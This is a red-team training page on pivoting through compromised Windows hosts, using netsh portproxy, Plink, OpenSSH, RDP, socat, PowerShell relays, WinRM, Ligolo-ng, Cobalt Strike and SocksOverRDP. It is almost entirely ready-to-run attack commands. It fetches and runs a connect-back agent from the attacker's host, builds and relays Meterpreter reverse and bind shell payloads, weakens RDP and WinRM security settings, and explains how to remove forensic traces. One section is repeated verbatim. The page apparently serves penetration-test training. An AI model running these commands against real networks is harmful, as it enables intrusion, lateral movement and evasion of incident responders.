---
layout: training-page
title: "Windows Pivoting — Red Team Academy"
module: "Pivoting & Tunneling"
tags:
  - netsh
  - plink
  - rdp-tunneling
  - socat
page_key: "pivoting-windows"
render_with_liquid: false
---

# Windows Pivoting

## Overview

Windows environments often lack the Linux tools that make pivoting straightforward, but native Windows capabilities and common administrative tools provide alternatives. netsh port proxy, PuTTY's Plink, RDP tunneling, and socat for Windows cover most scenarios. Knowing these is essential when dropping custom binaries is restricted.

![Windows pivoting tools: netsh portproxy, Plink.exe, socat.exe, and RDP tunneling through compromised Windows pivot host to internal domain network](/images/pivoting/windows-pivoting-tools.svg)  
*// windows pivoting — native tools and techniques through a compromised windows host*

## netsh — Native Windows Port Proxy

`netsh interface portproxy` creates port redirectors using built-in Windows functionality. It persists across reboots (stored in registry) and requires no additional software — only admin rights.

```
># Add a port proxy rule:
# Syntax: netsh interface portproxy add v4tov4 listenport=LPORT listenaddress=LIP connectport=RPORT connectaddress=RHOST

# Forward port 8080 on pivot to RDP (3389) on internal target:
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.19

# Now from outside: connect to PIVOT_IP:8080 → reaches 172.16.5.19:3389
xfreerdp /v:10.129.202.64:8080 /u:Administrator /p:'Password123!'

# Allow the port through Windows Firewall:
netsh advfirewall firewall add rule name="Pivot 8080" dir=in action=allow protocol=TCP localport=8080

# List all portproxy rules:
netsh interface portproxy show v4tov4

# Delete a rule:
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Reset all portproxy rules:
netsh interface portproxy reset
```

## netsh Port Proxy — Registry Detection and Persistence

netsh portproxy stores its rules in the Windows registry. Blue teams and incident responders check here — know the artifacts you leave behind.

```
# Registry location for portproxy rules:
# HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp

# View with reg query:
reg query HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp

# Output format:
# 0.0.0.0/8080    REG_SZ    172.16.5.19/3389
# Key = listenaddress/listenport
# Value = connectaddress/connectport

# Delete a specific rule directly from registry (alternative to netsh delete):
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp" /v "0.0.0.0/8080" /f

# View via PowerShell:
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp"

# Check via netstat (portproxy rules show up as LISTENING):
netstat -ano | findstr LISTENING
# Look for unexpected listening ports

# Full cleanup — remove all portproxy rules:
netsh interface portproxy reset
# Also remove the firewall rule if you added one:
netsh advfirewall firewall delete rule name="Pivot 8080"
```

## Plink (PuTTY Link) — SSH from Windows

Plink is the command-line SSH client that comes with PuTTY. It supports port forwarding and is commonly available on Windows systems or can be downloaded as a single .exe. Use it to create SSH tunnels from Windows pivots.

```
># Transfer plink.exe to Windows pivot:
# Download: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

# Dynamic SOCKS5 forward (pivot → attack box SSH server):
plink.exe -D 9050 -N attacker@10.10.14.5

# Local port forward — expose internal RDP via pivot:
plink.exe -L 8080:172.16.5.19:3389 attacker@10.10.14.5

# Reverse SSH (pivot initiates, opens port on attack box):
plink.exe -R 9050 attacker@10.10.14.5
# Attack box now has SOCKS5 at :9050 routed through the Windows pivot

# Non-interactive (accept host key automatically):
plink.exe -ssh -no-antispoof -batch -pw 'Password123!' -D 9050 attacker@10.10.14.5

# Background plink (using start /b):
start /b plink.exe -D 9050 -N attacker@10.10.14.5

# Plink as interactive tunnel then leave running:
plink.exe -N -L 3389:172.16.5.19:3389 ubuntu@10.129.202.64
```

## Windows SSH Client Pivoting (Native OpenSSH)

Windows 10 1803+ includes OpenSSH client natively. This means SSH port forwarding works on modern Windows without any extra tools.

```
># Windows 10/2019+ native SSH dynamic forward:
ssh -D 9050 ubuntu@10.129.202.64 -N

# Local port forward (internal RDP via pivot):
ssh -L 13389:172.16.5.19:3389 ubuntu@10.129.202.64 -N -f

# Verify SSH is available:
where ssh
ssh -V

# Check if OpenSSH is installed:
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

# Install if missing (requires internet):
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

# Background SSH process on Windows:
Start-Process ssh -ArgumentList "-D 9050 ubuntu@10.129.202.64 -N" -WindowStyle Hidden

# Remote port forward (pivot sends port back to attack box):
ssh -R 0.0.0.0:8080:127.0.0.1:80 attacker@10.10.14.5 -N
# Opens port 8080 on attack box, routes traffic to pivot's localhost:80

# SSH jump through pivot to deeper host:
ssh -J ubuntu@10.129.202.64 Administrator@172.16.5.19
```

## RDP Tunneling

RDP can itself be used as a tunnel via the `xfreerdp` `/drive` option or via custom tools. More practically, you can nest RDP sessions — RDP to pivot, then RDP from pivot to internal host. Windows 10/Server 2019+ supports this natively.

```
># Nested RDP (from pivot):
# Connect to pivot via RDP first
xfreerdp /v:10.129.202.64 /u:Administrator /p:'Password123!' /dynamic-resolution

# From within the RDP session, open another RDP to internal host:
mstsc.exe /v:172.16.5.19

# RDP over SSH tunnel — forward RDP port through SSH:
ssh -L 13389:172.16.5.19:3389 ubuntu@10.129.202.64 -N -f
xfreerdp /v:localhost:13389 /u:Administrator /p:'Password123!'

# RDP via netsh portproxy (already covered above):
netsh interface portproxy add v4tov4 listenport=13389 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.19

# Disable NLA (Network Level Authentication) to allow non-NLA RDP if needed:
# Requires admin + target system access
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
```

## socat on Windows

socat can be compiled for Windows and provides flexible port relay functionality. A Windows socat binary can relay TCP connections without admin rights (unlike netsh portproxy).

```
># socat relay — forward local port to remote host:
socat.exe TCP-LISTEN:8080,fork TCP:172.16.5.19:3389

# Relay with timeout:
socat.exe TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.5.19:3389

# socat as SOCKS5 proxy (if socat version supports it):
socat.exe TCP-LISTEN:1080,fork SOCKS5:172.16.5.19:80

# Multiple listeners (run in separate cmd windows):
socat.exe TCP-LISTEN:9001,fork TCP:172.16.5.19:22 &
socat.exe TCP-LISTEN:9002,fork TCP:172.16.5.19:80 &

# Check socat processes:
tasklist | findstr socat
```

## PowerShell TCP Port Forwarding One-Liner

When no tools are available, PowerShell can create a basic TCP relay. A shorter, more practical one-liner approach using a background job.

```
# PowerShell one-liner TCP forward — background job, forward :8080 → 172.16.5.19:3389
$j = Start-Job {
    $l = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Any, 8080); $l.Start()
    while($true){
        $c=$l.AcceptTcpClient(); $t=New-Object Net.Sockets.TcpClient("172.16.5.19",3389)
        $cs=$c.GetStream(); $ts=$t.GetStream()
        $b1=New-Object byte[] 65536; $b2=New-Object byte[] 65536
        Start-Job{param($a,$b,$c) while(($n=$a.Read($c,0,$c.Length))-gt 0){$b.Write($c,0,$n)}} -Arg $cs,$ts,$b1
        Start-Job{param($a,$b,$c) while(($n=$a.Read($c,0,$c.Length))-gt 0){$b.Write($c,0,$n)}} -Arg $ts,$cs,$b2
    }
}

# Original full PowerShell TCP relay:
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 8080)
$listener.Start()
while ($true) {
    $client = $listener.AcceptTcpClient()
    $target = New-Object System.Net.Sockets.TcpClient("172.16.5.19", 3389)
    $clientStream = $client.GetStream()
    $targetStream = $target.GetStream()
    $job = Start-Job {
        param($cs, $ts)
        $buf = New-Object byte[] 4096
        while (($n = $cs.Read($buf, 0, $buf.Length)) -gt 0) { $ts.Write($buf, 0, $n) }
    } -ArgumentList $clientStream, $targetStream
    Start-Job {
        param($cs, $ts)
        $buf = New-Object byte[] 4096
        while (($n = $ts.Read($buf, 0, $buf.Length)) -gt 0) { $cs.Write($buf, 0, $n) }
    } -ArgumentList $clientStream, $targetStream
}
```

## SSH Tunneling from Windows (Native OpenSSH)

Windows 10 1803+ includes OpenSSH client natively. This means SSH port forwarding works on modern Windows without any extra tools.

```
># Windows 10/2019+ native SSH dynamic forward:
ssh -D 9050 ubuntu@10.129.202.64 -N

# Local port forward (internal RDP via pivot):
ssh -L 13389:172.16.5.19:3389 ubuntu@10.129.202.64 -N -f

# Verify SSH is available:
where ssh
ssh -V

# Check if OpenSSH is installed:
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

# Install if missing (requires internet):
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

# Background SSH process on Windows:
Start-Process ssh -ArgumentList "-D 9050 ubuntu@10.129.202.64 -N" -WindowStyle Hidden
```

## WinRM Tunneling Through HTTP

WinRM (Windows Remote Management) operates over HTTP (5985) and HTTPS (5986). It can be proxied through HTTP tunnels or used over SSH local port forwards as part of a pivot chain.

```
# Access internal WinRM via SSH local port forward:
ssh -L 5985:172.16.5.19:5985 ubuntu@10.129.202.64 -N -f
evil-winrm -i localhost -p 5985 -u Administrator -p 'Password123!'

# Access WinRM via proxychains (SOCKS5 proxy must support HTTP correctly):
proxychains evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!'

# WinRM through netsh portproxy on Windows pivot:
netsh interface portproxy add v4tov4 listenport=5985 listenaddress=0.0.0.0 connectport=5985 connectaddress=172.16.5.19

# Enable WinRM on target (requires admin, run on target):
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

# Connect to WinRM via port forward:
$sess = New-PSSession -ComputerName localhost -Port 5985 -Credential (Get-Credential)
Enter-PSSession -Session $sess

# WinRM over HTTPS (port 5986) — requires valid cert:
evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!' -S
```

## Ligolo-ng on Windows (Agent Deployment)

Ligolo-ng's Windows agent is a single binary that connects back to your ligolo proxy. Drop it on a Windows pivot and get transparent TUN-based routing without proxychains. See the dedicated Ligolo-ng page for full proxy setup.

```
# Download Windows agent binary on attack box:
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_windows_amd64.zip
unzip ligolo-ng_agent_windows_amd64.zip
# Serve it:
python3 -m http.server 8000

# Deploy agent on Windows pivot via PowerShell:
Invoke-WebRequest -Uri "http://10.10.14.5:8000/agent.exe" -OutFile "C:\Windows\Temp\agent.exe"

# Execute the agent (connects back to your ligolo proxy):
C:\Windows\Temp\agent.exe -connect 10.10.14.5:11601 -ignore-cert

# Run hidden (no console window):
Start-Process -FilePath "C:\Windows\Temp\agent.exe" `
    -ArgumentList "-connect 10.10.14.5:11601 -ignore-cert" `
    -WindowStyle Hidden

# Verify agent connected — on attack box in ligolo proxy console:
ligolo-ng » session
# Lists connected agents

# Add route on attack box for the internal subnet:
sudo ip route add 172.16.5.0/24 dev ligolo

# Start the tunnel:
ligolo-ng » start

# Now all tools work natively from attack box:
nmap -sV 172.16.5.19
crackmapexec smb 172.16.5.0/24
```

## Cobalt Strike / Beacon Pivoting

Cobalt Strike beacons support SOCKS proxy listeners and SSH tunneling. When you have a beacon on a Windows pivot, you can route Cobalt Strike team server traffic through it.

```
# Beacon SOCKS proxy (from Cobalt Strike console or via script):
# Interact with beacon → right-click → Pivoting → SOCKS Server
# Or via aggressor script:
# beacon_socks(bid, port)   — opens SOCKS4a proxy on team server at :port

# Typical workflow:
# 1. Beacon checks in on Windows pivot
# 2. Open SOCKS listener: Beacon ID → Pivoting → SOCKS Server → port 1080
# 3. Configure proxychains to team server IP:1080 (if team server is accessible)
# 4. Or: use Cobalt Strike's built-in browser pivot for web access

# SSH tunneling through beacon (requires SSH module):
# Beacon → Pivoting → SSH Session
# Connects via SSH from beacon to internal SSH server
# Creates a tunnel back to team server

# rportfwd — reverse port forward from beacon:
# Beacon → Pivoting → Listener → create new listener with rportfwd type
# Or via console: rportfwd [bind port] [forward host] [forward port]
# e.g.: rportfwd 8080 172.16.5.19 80

# Remove all pivots from a beacon:
# rportfwd_local stop [bind port]
# Or via GUI: Beacon → Pivoting → remove

# OPSEC note: SOCKS proxies on beacons generate noticeable traffic patterns
# — use sparingly in monitored environments
```

## SocksOverRDP — SOCKS Proxy Through RDP Sessions

SocksOverRDP uses Dynamic Virtual Channels (DVC) in Windows RDP to tunnel SOCKS traffic. When you can only reach an internal network via RDP, this creates a SOCKS5 proxy without needing SSH or HTTP. Pair with Proxifier to route arbitrary tools.

```
# Download SocksOverRDP and Proxifier Portable to attack box:
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://www.proxifier.com/download/ProxifierPE.zip

# Connect via xfreerdp, transfer SocksOverRDPx64.zip to pivot
# On Windows pivot — register the RDP plugin DLL:
regsvr32.exe SocksOverRDP-Plugin.dll
# A popup confirms plugin enabled, SOCKS listener will start on 127.0.0.1:1080

# RDP from pivot to internal host (172.16.5.19) — SocksOverRDP-Server.exe must run on it:
mstsc.exe /v:172.16.5.19
# Transfer and run SocksOverRDP-Server.exe with admin rights on 172.16.5.19

# Verify SOCKS listener is running on pivot:
netstat -antb | findstr 1080
# TCP    127.0.0.1:1080   0.0.0.0:0   LISTENING

# Configure Proxifier on pivot:
# Proxy server: 127.0.0.1:1080, Type: SOCKS5
# Then launch mstsc.exe — traffic routes through SOCKS to 172.16.6.155
```

## socat Redirection — Reverse and Bind Shell Pivoting

socat can relay Meterpreter payloads through a pivot host without any Metasploit configuration. The pivot runs socat as a TCP redirector — transparent to both the payload and the handler.

```
# ── Reverse Shell via socat ───────────────────────────────────
# On pivot — relay incoming connections to attack box listener:
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
# Any connection to pivot:8080 → forwarded to attack box:80

# Create Windows payload pointing to pivot (not attack box):
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o payload.exe LPORT=8080

# Start MSF listener on attack box port 80:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run

# Execute payload on Windows target → connects to pivot:8080 → attack box:80

# ── Bind Shell via socat ──────────────────────────────────────
# Create bind payload on Windows target:
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o bind.exe LPORT=8443

# On pivot — relay attack box's connection to Windows bind shell:
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# MSF handler connects to pivot:8080, pivot relays to Windows:8443:
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

## Resources

- SocksOverRDP — https://github.com/nccgroup/SocksOverRDP
- Ligolo-ng — https://github.com/nicocha30/ligolo-ng
- OpenSSH for Windows — https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse
- PuTTY/Plink — https://www.chiark.greenend.org.uk/~sgtatham/putty/
- MITRE T1090 — Proxy
- MITRE T1572 — Protocol Tunneling
- MITRE T1021.006 — Remote Services: Windows Remote Management
